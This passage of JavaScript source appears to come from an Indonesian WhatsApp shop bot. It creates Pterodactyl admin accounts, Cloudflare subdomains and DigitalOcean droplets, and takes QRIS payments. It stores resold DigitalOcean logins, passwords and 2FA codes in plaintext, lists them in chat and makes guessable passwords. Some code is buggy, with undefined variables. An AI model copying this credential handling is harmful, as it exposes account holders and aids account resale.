Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!text) return m.reply(example("skyzo,6283XXX"))
if (!args[1]) {
let list = []
let input
let cc = text.split(",")
if (cc.length > 1) {
input = text.split(",")[0] + "," 
input += m.mentionedJid[0] ? m.mentionedJid[0] : text.split(",")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
} else {
input = text
}
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1} ${input}`
})
}
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}

if (Number(args[0]) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
let nomor
let usernem
let tek = args[1].split(",")
if (tek.length > 1) {
let [users, nom] = args[1].split(",")
if (!users || !nom) return m.reply(example("server username,nomor\n\nuntuk melihat server ketik *.listserver*\n\ncontoh *.cadmin* 2 skyzo,6283XXX"))
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = args[1].toLowerCase()
nomor = m.chat
}

var onWa = await gisnaxd.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di whatsapp!")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
let username = usernem
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await m.reply(`Akun admin panel *${capital(username)}* berhasil dibuat! data username dan password sudah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await gisnaxd.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addstok": case "adddo": case "addstokdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("skyzo@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
if (!text.split("|")) return m.reply(example("skyzo@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
const cek = text.split("|")
if (cek.length < 5) return m.reply(example("skyzo@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
let [email, pw, kode2fa, reff, droplet, harga] = text.split("|")
stokdo.push({
email: email, 
password: pw, 
kode2fa: kode2fa, 
referall: reff, 
droplet: droplet, 
harga: Number(harga)
})
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menambah data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delstok": case "delstokdo": case "deldo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return m.reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return m.reply(example("idnya\n\nKetik *.liststok* untuk lihat id"))
if (Number(text) > stokdo.length) return m.reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menghapus data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "liststok": case "liststokdo": case "listdo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
//if (m.isGroup) return Reply(mess.private)
let messageText = "\n *── List stok akun digital ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return m.reply(messageText)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addakses": case "addaksesgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
const input = m.chat
if (premium.includes(input)) return m.reply(`Grup ini sudah di beri akses reseller panel!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listakses": case "listaksesgc": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all grup reseller panel*\n`
for (let i of premium) {
let name = (await gisnaxd.groupMetadata(i)).subject || "Tidak ditemukan"
teks += `\n* ${i}
* *Nama :* ${name}\n`
}
gisnaxd.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delakses": case "delaksesgc": {
if (!isCreator) return Reply(mess.owner)
if (premium.length < 1) return m.reply("Tidak ada grup reseller panel")
if (!text) {
let list = []
for (let i of premium) {
let name = (await gisnaxd.groupMetadata(i)).subject || "Tidak ditemukan"
list.push({
title: `${name}`, 
description: i, 
id: `.${command} ${i}`
})
}
list.push({
title: `All Group Reseller`, 
description: "All group reseller", 
id: `.${command} all`
})
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let input = text
if (text == "all") {
await premium.splice(0, premium.length)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
return m.reply(`Berhasil menghapus semua grup reseller panel ✅`)
}
if (!premium.includes(input)) return m.reply(`Grup ini bukan grup reseller panel!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addserverpanel": case "addserver": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example(`domain(contoh skyzo.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
if (!text.split("|")) return m.reply(example(`domain(contoh skyzo.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
let dt = text.split('|')
if (dt.length < 6) return m.reply(example(`domain(contoh skyzo.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
let [dom, eg, nest, locc, ptla, ptlc] = dt
const natalia = {
"domain": `https://${dom}`, 
"egg": eg, 
"nestid": nest, 
"loc": loc, 
"apikey": ptla, 
"capikey": ptlc
}
serverpanel.push(natalia)
await fs.writeFileSync("./settingpanel.json", JSON.stringify(serverpanel, null, 2))
m.reply(`Berhasil menambah server panel *${dom}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listserverpanel": case "listserver": {
if (!isCreator) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
let tt = 0
let teks = "\n *── List all server panel*\n"
await serverpanel.forEach(e => teks += `\n* ${tt += 1}. ${e.domain.split("https://")[1]}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delserverpanel": case "delserver": {
if (!isCreator) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}

list.push({
title: `All Server Panel`,
id: `.${command} all`
})

return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return m.reply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.delserver* 2"))
if (args[0] == "all") {
await serverpanel.splice(0, serverpanel.length)
await fs.writeFileSync("./settingpanel.json", JSON.stringify(serverpanel, null, 2))
return m.reply(`Berhasil menghapus semua server panel`)
}
if (Number(text) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
let dom = serverpanel[Number(text) - 1].domain
await serverpanel.splice((Number(text) - 1), 1)
await fs.writeFileSync("./settingpanel.json", JSON.stringify(serverpanel, null, 2))
m.reply(`Berhasil menghapus server panel *${dom.split("https://")[1]}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addidch": case "addch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idchnya"))
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return m.reply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menambah id channel kedalam database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delidch": case "delch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
if (!text) return m.reply(example("idchnya"))
if (text.toLowerCase() == "all") {
listidch.splice(0, listidch.length)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch))
return m.reply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return m.reply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menghapus id channel dari database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listidch": case "listch": {
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
gisnaxd.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break


case "buyscript": case "buysc": {
if (m.isGroup) return m.reply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Simple Botz V5', 
                  description: "Rp35.000", 
                  id: '.buysc 1'
                },
                {
                  title: 'Simple Bot V6', 
                  description: "Rp50.000", 
                  id: '.buysc 2'
                },
                {
                  title: 'Web Rest API', 
                  description: "Rp50.000", 
                  id: '.buysc 3'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Simple Bot V5"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "50000"
    Obj.namaSc = "Script Simple Bot V6"  
    } else if (tek == "3") {
    Obj.file = "./source/media/script3.zip"
    Obj.harga = "50000"
    Obj.namaSc = "Web Rest API"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.restapi}/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  

 *• Total Pembayaran :* Rp${amount}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: `© 2024 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.restapi}/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

case "buyvps": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["buyvps"]) return Reply("❌ Produk *VPS* saat ini tidak tersedia!");

if (!text) return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp60.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp25.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp50.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V3`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "50000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "60000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* VPS DIGITAL OCEAN
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await gisnaxd.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "topupsaldo": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["topupsaldo"]) return Reply("❌ Produk *TOPUP EWALLET* saat ini tidak tersedia!");
if (!args[0]) return m.reply(example("085XXX"))
if (!args[0].startsWith("08")) return m.reply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const { data } = await axios.get("https://www.okegisnaxdect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Top Up Saldo GO-JEK/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Top Up Saldo DANA/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.topupsaldo ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Nominal Topup Saldo',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V3`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Saldo\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* ${Obj.nominal}
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
